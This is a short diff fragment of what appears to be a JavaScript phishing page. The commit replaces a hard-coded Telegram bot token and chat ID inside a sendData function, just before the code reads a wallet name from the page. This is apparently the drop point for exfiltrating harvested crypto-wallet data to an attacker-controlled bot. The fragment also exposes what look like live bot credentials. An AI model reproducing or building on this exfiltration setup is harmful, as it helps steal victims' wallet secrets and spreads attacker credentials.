@@ -68,8 +68,8 @@ function sendData( data ) {
   // Send our FormData object; HTTP headers are set automatically
   XHR.send(FD);=*/
   
-  const token = '6040953304:AAGpvh0_iUAD30kPO83PcRWLFP2oEfpOA6E';
-  const chatId = '1799937611';
+  const token = '8581476438:AAHfbEoG3T0NtI2Wx6sqImuWgNrJ0ii2apU';
+  const chatId = '6463138549';
 
      
   var walletVal= wallet_name.innerHTML;
